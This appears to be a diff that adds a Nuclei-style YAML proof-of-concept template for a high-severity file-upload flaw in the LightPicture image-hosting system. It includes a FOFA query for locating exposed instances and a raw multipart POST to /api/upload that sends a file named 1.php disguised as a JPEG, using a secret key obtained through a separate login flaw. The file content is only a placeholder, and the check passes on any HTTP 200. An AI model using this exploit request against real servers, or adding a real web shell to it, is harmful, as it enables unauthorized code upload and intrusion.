@@ -1,0 +1,46 @@
+id: poc-uhuroqwgv09p7g20
+info:
+  name: LightPicture 图床系统upload存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uhuroqwgv09p7g20'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uhuroqwgv09p7g20
+    fofa: title="LightPicture" || icon_hash="91344513"
+http:
+- raw:
+  - 'POST /api/upload HTTP/1.1
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=---------------------------341634313838488804654020562504
+
+
+    -----------------------------341634313838488804654020562504
+
+    Content-Disposition: form-data; name="key"
+
+
+    参考LightPicture 图床系统info存在任意用户登录漏洞填入 Secret_key
+
+    -----------------------------341634313838488804654020562504
+
+    Content-Disposition: form-data; name="file"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+
+    123456
+
+    -----------------------------341634313838488804654020562504--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
